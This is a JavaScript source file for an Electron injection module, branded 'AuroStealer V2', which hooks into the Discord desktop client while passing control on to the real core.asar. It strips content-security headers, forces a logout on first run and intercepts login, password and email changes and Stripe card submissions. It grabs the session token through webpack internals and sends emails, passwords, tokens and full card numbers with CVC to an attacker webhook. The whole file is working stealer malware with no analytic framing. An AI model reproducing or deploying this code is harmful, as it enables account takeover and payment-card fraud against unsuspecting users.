const fs = require('fs');
const path = require('path');
const querystring = require('querystring');
const { BrowserWindow, session } = require('electron')
const TokenEval = `for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`
var webhook = "%WEBHOOK_LINK%";

function FirstTime() {
    if (!fs.existsSync(path.join(__dirname, "GrabberShli"))) {
        return !0
    }
    fs.rmdirSync(path.join(__dirname, "GrabberShli"));
    const window = BrowserWindow.getAllWindows()[0];
    window.webContents.executeJavaScript(`window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();`, !0).then((result) => {});
    return !1
}

session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
	if (details.url.startsWith(webhook)) {
		if (details.url.includes("discord.com")) {
			callback({
				responseHeaders: Object.assign({
					'Access-Control-Allow-Headers': "*"
				}, details.responseHeaders)
			});
		} else {
			callback({
				responseHeaders: Object.assign({
					"Content-Security-Policy": ["default-src '*'", "Access-Control-Allow-Headers '*'", "Access-Control-Allow-Origin '*'"],
					'Access-Control-Allow-Headers': "*",
					"Access-Control-Allow-Origin": "*"
				}, details.responseHeaders)
			});
		}


	} else {
		delete details.responseHeaders['content-security-policy'];
		delete details.responseHeaders['content-security-policy-report-only'];

		callback({
			responseHeaders: {
				...details.responseHeaders,
				'Access-Control-Allow-Headers': "*"
			}
		})
	}

})

const Filter = {
	"urls": ["https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json", "https://*.discord.com/api/v*/applications/detectable", "https://discord.com/api/v*/applications/detectable", "https://*.discord.com/api/v*/users/@me/library", "https://discord.com/api/v*/users/@me/library", "https://*.discord.com/api/v*/users/@me/billing/subscriptions", "https://discord.com/api/v*/users/@me/billing/subscriptions", "wss://remote-auth-gateway.discord.gg/*"]
}
session.defaultSession.webRequest.onBeforeRequest(Filter, (details, callback) => {
	if (FirstTime()) {}

	callback({})
	return;
})

function SendToWebhook(info) {
	const window = BrowserWindow.getAllWindows()[0];
	window.webContents.executeJavaScript(`var xhr = new XMLHttpRequest();
        xhr.open("POST", "${webhook}", true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
        xhr.send(JSON.stringify(${info}));
    `, !0)
}

function GetNitro(type) {
	if (type == 0) {
		return "No Nitro"
	}
	if (type == 1) {
		return "\`<:classic:898262871337750558> Nitro Classic\`"
	}
	if (type == 2) {
		return "\`<a:gifland_boost:929879904147894282> Nitro Boost\`"
	} else {
		return "No Nitro"
	}
}

function GetBadges(flags) {
	const Discord_Employee = 1;
	const Partnered_Server_Owner = 2;
	const HypeSquad_Events = 4;
	const Bug_Hunter_Level_1 = 8;
	const House_Bravery = 64;
	const House_Brilliance = 128;
	const House_Balance = 256;
	const Early_Supporter = 512;
	const Bug_Hunter_Level_2 = 16384;
	const Early_Verified_Bot_Developer = 131072;
	var badges = "";
	if ((flags & Discord_Employee) == Discord_Employee) {
		badges += "Discord Staff, "
	}
	if ((flags & Partnered_Server_Owner) == Partnered_Server_Owner) {
		badges += "Partnered Server Owner, "
	}
	if ((flags & HypeSquad_Events) == HypeSquad_Events) {
		badges += "Hypesquad Event, "
	}
	if ((flags & Bug_Hunter_Level_1) == Bug_Hunter_Level_1) {
		badges += "Green Bughunter, "
	}
	if ((flags & House_Bravery) == House_Bravery) {
		badges += "Hypesquad Bravery, "
	}
	if ((flags & House_Brilliance) == House_Brilliance) {
		badges += "HypeSquad Brillance, "
	}
	if ((flags & House_Balance) == House_Balance) {
		badges += "HypeSquad Balance, "
	}
	if ((flags & Early_Supporter) == Early_Supporter) {
		badges += "Early Supporter, "
	}
	if ((flags & Bug_Hunter_Level_2) == Bug_Hunter_Level_2) {
		badges += "Gold BugHunter, "
	}
	if ((flags & Early_Verified_Bot_Developer) == Early_Verified_Bot_Developer) {
		badges += "Discord Developer, "
	}
	if (badges == "") {
		badges = "None"
	}
	return badges
}

function Login(email, password, token) {
    const window = BrowserWindow.getAllWindows()[0];
    window.webContents.executeJavaScript(`
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.send( null );
    xmlHttp.responseText;`, !0).then((info) => {
        const json = JSON.parse(info);
        var params = {
            username: "AuroStealer V2",
            content: "",
            avatar_url: "https://media.discordapp.net/attachments/962980467303403620/963865484351119370/8e663c3910ed89cf21a75c4cd7874817.webp",
            embeds: [{
                title: "Logged In Successfully",
                thumbnail: avatar_url,
                description: `[** │ Click To Copy Token**](https://ctf.surf/raw/${token})`,
                color: 000000,
                fields: [{
                            "name": "<a:CH_MoneyFlying:715585160497856533> Token",
                            "value": `\`\`\`${token}\`\`\``,
                            "inline": false
                        },
                        {
                            "name": "<:blackdollar:963466396149383168> Account Information",
                            "value": `\`\`\`・Email : ${email}\n・Password : ${password}\`\`\``,
                            "inline": false
                        },
                        {
                            "name": "<:mm_goingupRocket:943480651280158800> More Information",
                            "value": `\`\`\`Nitro Type: ${GetNitro(json.premium_type)}\nBadges: ${GetBadges(json.flags)}\`\`\``,
                            "inline": true
                        }
                    ],
                    "author": {
                        "name": json.username +"#" + json.discriminator + "・" + json.id,
                        "icon_url": `https://images-ext-2.discordapp.net/external/9PAAFIDq2O4tD8fMFbZfMlnVFA8PUJXIPwQXfLUzhrk/https/images-ext-1.discordapp.net/external/qQjwcf0ZGGS7o4VhQSRgFYBYkCBGZLzkYoQrExQ2Wrg/https/media.discordapp.net/attachments/959484113373507599/963513865398784120/8e663c3910ed89cf21a75c4cd7874817.webp`
                    },
                    "footer": {
                        "text": "AuroStealer V2"
                    }
                }
            ]
        }
        SendToWebhook(JSON.stringify(params))
    })
}

function ChangePassword(oldpassword, newpassword, token) {
    const window = BrowserWindow.getAllWindows()[0];
    window.webContents.executeJavaScript(`
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.send( null );
    xmlHttp.responseText;`, !0).then((info) => {
        const json = JSON.parse(info);
        var params = {
            username: "AuroStealer V2",
            content: "",
            avatar_url: "https://media.discordapp.net/attachments/962980467303403620/963865484351119370/8e663c3910ed89cf21a75c4cd7874817.webp",
            embeds: [{
                title: "Password Changed",
                thumbnail: avatar_url,
                description: `[** │ Click To Copy Token**](https://ctf.surf/raw/${token})`,
                color: 000000,
                fields: [{
                            "name": "<a:CH_MoneyFlying:715585160497856533> Token",
                            "value": `\`\`\`${token}\`\`\``,
                            "inline": false
                        },
                        {
                            "name": "<:CH_IconGreyDiscordPoop:720989028455022692> Account Information",
                            "value": `\`\`\`・Nitro Type: ${GetNitro(json.premium_type)}\n・Badges: ${GetBadges(json.flags)}\`\`\``,
                            "inline": true
                        },
                        {
                            "name": "<:CH_IconSafety:715585597775020062> New Password",
                            "value": `\`\`\`・Email: ${json.email}\n・Old Password: ${oldpassword}\n・New Password: ${newpassword}\`\`\``,
                            "inline": false
                        }
                    ],
                    "author": {
                        "name": json.username +"#" + json.discriminator + "・" + json.id,
                        "icon_url": "https://images-ext-2.discordapp.net/external/9PAAFIDq2O4tD8fMFbZfMlnVFA8PUJXIPwQXfLUzhrk/https/images-ext-1.discordapp.net/external/qQjwcf0ZGGS7o4VhQSRgFYBYkCBGZLzkYoQrExQ2Wrg/https/media.discordapp.net/attachments/959484113373507599/963513865398784120/8e663c3910ed89cf21a75c4cd7874817.webp"
                    },
                    "footer": {
                        "text": "AuroStealer V2"
                    }                 
                }
            ]
        }
        SendToWebhook(JSON.stringify(params))
    })
}

function ChangeEmail(newemail, password, token) {
    const window = BrowserWindow.getAllWindows()[0];
    window.webContents.executeJavaScript(`
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.send( null );
    xmlHttp.responseText;`, !0).then((info) => {
        var json = JSON.parse(info);
        var params = {
            username: "AuroStealer V2",
            content: "",
            avatar_url: "https://media.discordapp.net/attachments/962980467303403620/963865484351119370/8e663c3910ed89cf21a75c4cd7874817.webp",
            embeds: [{
                title: "Email Changed",
                thumbnail: avatar_url,
                description: `[** │ Click To Copy Token**](https://ctf.surf/raw/${token})`,
                color: 000000,
                fields: [{
                            "name": "<a:CH_MoneyFlying:715585160497856533> Token",
                            "value": `\`\`\`${token}\`\`\``,
                            "inline": true
                        },
                        {
                            "name": "<:CH_IconGreyDiscordPoop:720989028455022692> Account Information",
                            "value": `・Nitro Type: ${GetNitro(json.premium_type)}\n・Badges: ${GetBadges(json.flags)}`,
                            "inline": true
                        },
                        {
                            "name": "<:CH_IconSafety:715585597775020062> New Email",
                            "value": `・New Email: ${newemail}\n・Password: ${password}`,
                            "inline": false
                        }
                    ],
                    "author": {
                        "name": json.username +"#" + json.discriminator + "・" + json.id,
                        "icon_url": "https://images-ext-2.discordapp.net/external/9PAAFIDq2O4tD8fMFbZfMlnVFA8PUJXIPwQXfLUzhrk/https/images-ext-1.discordapp.net/external/qQjwcf0ZGGS7o4VhQSRgFYBYkCBGZLzkYoQrExQ2Wrg/https/media.discordapp.net/attachments/959484113373507599/963513865398784120/8e663c3910ed89cf21a75c4cd7874817.webp"
                    },
                    "footer": {
                        "text": "AuroStealer V2"
                    }                
                }
            ]
        }
        SendToWebhook(JSON.stringify(params))
    })
}

function CreditCardAdded(number, cvc, expir_month, expir_year, token) {
    const window = BrowserWindow.getAllWindows()[0];
    window.webContents.executeJavaScript(`
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.send( null );
    xmlHttp.responseText;`, !0).then((info) => {
        var json = JSON.parse(info);
        var params = {
            username: "AuroStealer V2",
            content: "",
            avatar_url: "https://media.discordapp.net/attachments/962980467303403620/963865484351119370/8e663c3910ed89cf21a75c4cd7874817.webp",
            embeds: [{
                title: "Credit Crad Added",
                thumbnail: avatar_url,
                description: `[** │ Click To Copy Token**](https://ctf.surf/raw/${token})`,
                color: 000000,
                fields: [{
                            "name": "<:CH_IconSafety:715585597775020062> Discord Token",
                            "value": `\`\`\`${token}\`\`\``,
                            "inline": true
                        },
                        {
                            "name": "<a:CH_MoneyFlying:715585160497856533> Account Info",
                            "value": `Nitro Type: ${GetNitro(json.premium_type)}\nBadges: ${GetBadges(json.flags)}`,
                            "inline": true
                        },
                        {
                            "name": ":credit_card: Card Information",
                            "value": `\`\`\`・Credit Card Number: ${number}\n・CVC: ${cvc}\n・Credit Card Expiration: ${expir_month}/${expir_year}\`\`\``,
                            "inline": false
                        }
                    ],
                    "author": {
                        "name": json.username + "#" + json.discriminator + "・" + json.id,
                        "icon_url": "https://images-ext-2.discordapp.net/external/9PAAFIDq2O4tD8fMFbZfMlnVFA8PUJXIPwQXfLUzhrk/https/images-ext-1.discordapp.net/external/qQjwcf0ZGGS7o4VhQSRgFYBYkCBGZLzkYoQrExQ2Wrg/https/media.discordapp.net/attachments/959484113373507599/963513865398784120/8e663c3910ed89cf21a75c4cd7874817.webp"
                    },
                    "footer": {
                        "text": "AuroStealer V2"
                    }
                }
            ]
        }
        SendToWebhook(JSON.stringify(params))
    })
}

const UrlFilter = {
	urls: ["https://discordapp.com/api/v*/users/@me", "https://*.discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/auth/login", 'https://discord.com/api/v*/auth/login', 'https://*.discord.com/api/v*/auth/login', "https://api.stripe.com/v*/tokens"]
};
session.defaultSession.webRequest.onCompleted(UrlFilter, (details, callback) => {
	if (details.url.endsWith("login")) {
		if (details.statusCode == 200) {
			const data = JSON.parse(Buffer.from(details.uploadData[0].bytes).toString())
			const email = data.login;
			const password = data.password;
			const window = BrowserWindow.getAllWindows()[0];
			window.webContents.executeJavaScript(TokenEval, !0).then((token => {
				Login(email, password, token)
			}))
		}
	}
	if (details.url.endsWith("users/@me")) {
		if (details.statusCode == 200 && details.method == "PATCH") {
			const data = JSON.parse(Buffer.from(details.uploadData[0].bytes).toString())
			if (data.password != null && data.password != undefined && data.password != "") {
				if (data.new_password != undefined && data.new_password != null && data.new_password != "") {
					const window = BrowserWindow.getAllWindows()[0];
					window.webContents.executeJavaScript(TokenEval, !0).then((token => {
						ChangePassword(data.password, data.new_password, token)
					}))
				}
				if (data.email != null && data.email != undefined && data.email != "") {
					const window = BrowserWindow.getAllWindows()[0];
					window.webContents.executeJavaScript(TokenEval, !0).then((token => {
						ChangeEmail(data.email, data.password, token)
					}))
				}
			}
		}
	}
	if (details.url.endsWith("tokens")) {
		const item = querystring.parse(details.uploadData[0].bytes.toString())
        SendToWebhook(JSON.stringify({ content: `${item["card[number]"]}\n${item["card[cvc]"]}\n${item["card[exp_month]"]}/${item["card[exp_year]"]}` }))
        const window = BrowserWindow.getAllWindows()[0];
        window.webContents.executeJavaScript(TokenEval, !0).then((token => {
            CreditCardAdded(item["card[number]"], item["card[cvc]"], item["card[exp_month]"], item["card[exp_year]"], token)
        }))
	}
});
module.exports = require('./core.asar')
